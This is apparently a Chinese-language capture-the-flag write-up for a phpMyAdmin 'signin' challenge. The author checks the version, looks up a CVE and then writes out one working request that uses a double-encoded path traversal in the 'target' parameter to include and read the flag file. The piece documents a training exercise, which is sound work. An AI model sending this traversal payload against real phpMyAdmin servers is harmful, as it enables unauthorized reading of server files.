#Web #phpmyadmin #Vulnerabilities 

```
/
```

![[Pasted image 20230508011106.png|1500]]

题目描述
---

> Vulnerability signin~

hint
---

> 不是sql哦~

---

是的这题不需要考虑phpMyAdmin是什么奇怪的玩意，也不需要考虑SQL注入之类的东西（test用户啥权限也没）

首先我们看一眼版本

![[Pasted image 20230508011543.png|300]]

然后让我们去[CVE](https://cve.mitre.org/cve/search_cve_list.html)上搜一搜

![[Pasted image 20230508012042.png|1500]]

![[Pasted image 20230508012629.png|800]]

![[Pasted image 20230508012642.png|800]]

```
/index.php?a=phpinfo();&target=db_sql.php%253f/../../../../../../flag
```

![[Pasted image 20230508230625.png|800]]